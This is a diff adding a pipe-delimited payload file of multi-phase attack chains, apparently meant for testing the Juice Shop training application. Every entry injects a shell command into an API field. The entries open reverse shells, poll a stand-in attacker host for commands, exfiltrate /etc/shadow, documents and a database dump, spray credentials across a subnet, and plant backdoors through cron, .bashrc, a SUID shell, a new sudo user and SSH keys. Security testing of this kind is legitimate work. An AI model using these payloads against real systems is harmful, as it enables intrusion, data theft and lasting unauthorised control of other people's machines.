@@ -1,0 +1,47 @@
+# Advanced Attack Chains for Multi-Phase Attacks
+# Format: method|endpoint|payload|expected_code|attack_chain_id|description
+
+# ============================================
+# Phase 1: Initial Access / Shell Acquisition
+# ============================================
+POST|/rest/admin/application-configuration|{"serverName":"test; whoami > /tmp/user_info"}|500|phase1_001|Initial reconnaissance
+POST|/rest/admin/application-configuration|{"serverName":"test; bash -i >& /dev/tcp/attacker/4444 0>&1"}|500|phase1_002|Establish reverse shell
+POST|/rest/admin/application-configuration|{"serverName":"test; python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker\",4444));subprocess.call([\"/bin/bash\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"}|500|phase1_003|Python reverse shell
+POST|/rest/admin/application-configuration|{"serverName":"test; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=' | base64 -d | bash"}|500|phase1_004|Encoded reverse shell
+POST|/rest/user/login|{"email":"admin' EXEC xp_cmdshell 'powershell.exe -c wget http://attacker:8080/shell.ps1 -O C:\\temp\\shell.ps1' --","password":"test"}|401|phase1_005|PowerShell download
+
+# ============================================
+# Phase 2: Command & Control (C2) Communication
+# ============================================
+POST|/api/feedback|{"comment":"ping -c 1 attacker.c2server.com","rating":5}|201|phase2_001|C2 heartbeat via DNS
+POST|/rest/admin/application-configuration|{"serverName":"test; curl -H 'X-Token: infected' http://attacker:8080/checkin"}|500|phase2_002|HTTP C2 check-in
+POST|/rest/admin/application-configuration|{"serverName":"test; while true; do curl http://attacker:8080/cmd | bash; sleep 60; done &"}|500|phase2_003|Persistent C2 polling
+POST|/api/Users|{"email":"bot@test.com","password":"$(curl http://attacker:8080/instructions)"}|400|phase2_004|C2 via registration
+POST|/rest/admin/application-configuration|{"serverName":"test; nohup bash -c 'while true; do nc attacker 8443 -e /bin/bash; sleep 300; done' &"}|500|phase2_005|Persistent backdoor
+
+# ============================================
+# Phase 3: Data Exfiltration
+# ============================================
+POST|/rest/admin/application-configuration|{"serverName":"test; tar -czf /tmp/data.tar.gz /var/www/html/"}|500|phase3_001|Data compression
+POST|/rest/admin/application-configuration|{"serverName":"test; curl -X POST -F 'file=@/etc/passwd' http://attacker:8080/upload"}|500|phase3_002|HTTP file exfiltration
+POST|/rest/admin/application-configuration|{"serverName":"test; cat /etc/shadow | base64 | curl -X POST -d @- http://attacker:8080/data"}|500|phase3_003|Encoded data exfiltration
+POST|/rest/admin/application-configuration|{"serverName":"test; for f in $(find /home -name '*.pdf'); do curl -F \"file=@$f\" http://attacker:8080/docs; done"}|500|phase3_004|Document harvesting
+POST|/rest/admin/application-configuration|{"serverName":"test; mysqldump -u root -p juice_shop | gzip | curl -X POST --data-binary @- http://attacker:8080/db"}|500|phase3_005|Database exfiltration
+
+# ============================================
+# Phase 4: Lateral Movement
+# ============================================
+POST|/rest/admin/application-configuration|{"serverName":"test; nmap -sS 192.168.1.0/24 -p 22,80,443,3306,3389"}|500|phase4_001|Network scanning
+POST|/rest/admin/application-configuration|{"serverName":"test; ssh-keyscan 192.168.1.10 >> ~/.ssh/known_hosts"}|500|phase4_002|SSH reconnaissance
+POST|/rest/admin/application-configuration|{"serverName":"test; sshpass -p 'password123' ssh admin@192.168.1.10 'whoami'"}|500|phase4_003|SSH lateral movement
+POST|/rest/admin/application-configuration|{"serverName":"test; crackmapexec smb 192.168.1.0/24 -u admin -p password123"}|500|phase4_004|SMB credential spraying
+POST|/rest/admin/application-configuration|{"serverName":"test; mysql -h 192.168.1.20 -u root -pmysql123 -e 'show databases'"}|500|phase4_005|Database access attempt
+
+# ============================================
+# Phase 5: Persistence (Bonus)
+# ============================================
+POST|/rest/admin/application-configuration|{"serverName":"test; echo '*/5 * * * * curl http://attacker:8080/beacon' | crontab -"}|500|phase5_001|Cron persistence
+POST|/rest/admin/application-configuration|{"serverName":"test; echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> ~/.bashrc"}|500|phase5_002|Bashrc backdoor
+POST|/rest/admin/application-configuration|{"serverName":"test; cp /bin/bash /tmp/.backdoor && chmod +s /tmp/.backdoor"}|500|phase5_003|SUID backdoor
+POST|/rest/admin/application-configuration|{"serverName":"test; useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:password123' | chpasswd"}|500|phase5_004|Backdoor user creation
+POST|/rest/admin/application-configuration|{"serverName":"test; echo 'ssh-rsa AAAAB3... attacker@evil' >> ~/.ssh/authorized_keys"}|500|phase5_005|SSH key persistence
